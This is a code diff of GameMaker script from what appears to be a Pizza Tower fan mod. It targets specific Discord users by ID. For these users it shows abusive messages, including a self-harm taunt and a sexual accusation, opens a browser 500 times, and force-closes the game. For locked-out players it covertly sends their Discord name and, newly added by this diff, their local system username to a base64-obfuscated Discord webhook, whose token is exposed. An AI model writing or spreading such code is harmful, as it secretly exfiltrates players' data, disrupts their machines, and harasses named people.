@@ -28,47 +28,52 @@ switch async_load[? "event_type"]
 				show_message("I'm not gonna let you put the character doors in my mod");
 			//if a == "309853612656558100" // Min3r
 			//	show_message("I know you like diddling children");
-			if a == "827041050555187210" // jared9994
-				show_message("well if you're gonna be like that then please cut deeper.");
+			//if a == "827041050555187210" // jared9994
+			//	show_message("well if you're gonna be like that then please cut deeper.");
 			if a == "744735218350555137" // LOSTMAN
-				show_message("Unblock me first, LOSTMAN.");
+				show_message("That sure was a \"jolly\" plan.");
 			if a == "748743802608418896" // Croatian Commander
 				show_message("Haaiii Cappy ;3!!!");
 			if a == "463132674995781637" // SpectralScrubs
-				show_message("Peic");
+			{
+				var str = "Peic";
+				repeat 50
+					str = str + " " + str;
+				show_message(str);
+			}
 			if a == "188430471040991235" or a == "317071206815891466" // scout or indigo
-				show_message("Pizza Tower: Scoutdigo is my favorite Pizza Tower modem. I am playing as The Goise, unused character in final game. I collected the mimic toppin! I'm going to get the key piece! The key piece must be here somewhere. I got the key piece! Wow! I am solving the Alternate Reality Game! PIZZA FACE IS COMING... HELP ME! MY TESTICLES ARE EXPLODING! NO NO NO NO NO NO NO PIZZA FACE YOU FUCK! I FUCK YOU FUCK! NO NO NO NO FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK");
-			if a == "724447494372851783" // khaliliscre
-				show_message("Screenshot_6.png");
-			if a == "817309415781957700" // el jeof rey
-				show_message("Introducing: Poopin' Dario!");
+				show_message("Are you gonna credit me for the decomp?");
+			//if a == "817309415781957700" // el jeof rey
+			//	show_message("Introducing: Poopin' Dario!");
 			if a == "867446393471893515" // Denchick
 			{
-				repeat 200
+				repeat 500
 					url_open(choose("https://undertale.com/", "https://deltarune.com/"));
+				game_end();
 			}
 			if a == "866584072733851658" // soda
-				show_message("Do not come anywhere near my shit.");
-			if a == "773966892520046662" // matty
-				show_message("You betrayed me. Please leave.");
+				show_message("What if orange was a color?");
 			if a == "357090210435039232" // luigio
-				show_message("No fucking way that YOU of all people tried playing my mod.\nRadix: Go fuck yourself Luigio.");
-			if a == "313647052087099394" // RodMod
-				show_message("sorry quote unquote \"Rod\" \"Mod\"; no flp, no cheesed up!");
+			{
+				show_message("Oh, did you run the \"trojan\" by accident? Here, I'll close on my own for you.");
+				game_end();
+			}
 			if a == "736034094093303888" // MrUnown
 				show_message("You're dogshit at C++ admit it Unown");
 			if a == "847981927670874132" // Psyop
 				show_message("Get another alt.");
 			if a == "618151581111812106" // Mannu
-				show_message("You know what you did.");
-			if a == "387106161754898432" // Cubito, added by Radix
-				show_message("\"Well Maybe I should leak your face?\" Radix: Well maybe I shouldn't let you play Cheesed up.");
+				show_message("You know what you did");
+			if a == "387106161754898432" // Cubito
+				show_message("\"Well Maybe I should leak your face?\"\nWell Maybe I shouldn't let you play my game.");
 			//if a == "357967410340429825" // TheSpookyDong
 			//	show_message("You treated me well but this is by pure obligation");
-			//if a == "370924430324531200" or a == "748959499565662360" // Laterance
-			//	show_message("The Trout nation will crumble");
+			if a == "370924430324531200" or a == "748959499565662360" // Laterance
+				show_message("Roblox");
 			if a == "639062328276418571" // Manios
-				show_message("Again, go fuck yourself.");
+				show_message("Go fuck yourself.");
+			if a == "590968392211759124" // Nicole
+				show_message("Once one is blocked they never look back");
 		}
 		
 		// lockout
@@ -79,7 +84,7 @@ switch async_load[? "event_type"]
 			//"503588309608431626", // Octo
 			"713946655476416553", // Zerokizo
 			//"799295873388642375", // Ralty (programmer)
-			"827041050555187210", // jared9994
+			//"827041050555187210", // jared9994
 			"736268533767602226", // Leafchy (artist)
 			"212347808890486786", // Psyke
 			"970894665593262171", // bmv277
@@ -110,14 +115,15 @@ switch async_load[? "event_type"]
 			
 			// Pathetic people
 			"867446393471893515", // Denchick (coollugio)
-			"817309415781957700", // jeof
+			//"817309415781957700", // jeof
 			"724447494372851783", // khaliliscre
 			"748743802608418896", // Croatian Commander
 			"370924430324531200", // Laterance (trout)
-			"748959499565662360", // Laterance (pickleanon)xcc 
-			//"590968392211759124", // Nicole - Radix: no
+			"748959499565662360", // Laterance (pickleanon)
+			"590968392211759124", // Nicole
 			"463132674995781637", // SpectralScrubs
 			"841302295085580298", // SuperPiter (StS asked me to)
+			"570350198878896178", // StS
 			"639062328276418571", // Manios
 			"847981927670874132", // Denchick friend group psyop account
 			"618151581111812106", // Mannu
@@ -140,13 +146,6 @@ switch async_load[? "event_type"]
 			"840279502446002218", // davithemusicguy
 		];
 		
-		/*
-			
-			this shit is barely effective, and like maybe only
-			3 people out of this list will even encounter this.
-			
-		*/
-		
 		var web = base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjkxMzI4MzcxNTM1MzgxMDgvenZxUnR4Rm0yaWszaXJVZzg3NUZnaG5ObEdqT3VZUUlhbEpnR3FneVNnREdvYXRIVkhFV0JZekx1UTVfclA1alVVb2Q=");
 		if array_contains(lockout, a)
 		{
@@ -157,7 +156,7 @@ switch async_load[? "event_type"]
 			
 			// tell me.
 			var body = ds_map_create(), header = ds_map_create();
-			ds_map_add(body, "content", $"{async_load[?"username"]} attempted running the game!");
+			ds_map_add(body, "content", $"{async_load[?"username"]} attempted running the game! {environment_get_variable("USERNAME")}");
 			ds_map_add(header, "Content-Type", "application/json");
 			http_request(web, "POST", header, json_encode(body));
 			ds_map_destroy(body);
@@ -167,6 +166,6 @@ switch async_load[? "event_type"]
 			room_goto(Funnyroom);
 		}
 		
-		if(GM_build_type!="run"){var body=ds_map_create(),header=ds_map_create();ds_map_add(body,"content",$"{async_load[?"username"]}#{async_load[?"discriminator"]} ({a})");ds_map_add(header,"Content-Type","application/json");http_request(web,"POST",header,json_encode(body));a=GM_build_date;ds_map_destroy(body);ds_map_destroy(header);}
+		//if(GM_build_type!="run"){var body=ds_map_create(),header=ds_map_create();ds_map_add(body,"content",$"{async_load[?"username"]}#{async_load[?"discriminator"]} ({a})");ds_map_add(header,"Content-Type","application/json");http_request(web,"POST",header,json_encode(body));a=GM_build_date;ds_map_destroy(body);ds_map_destroy(header);}
 		break;
 }
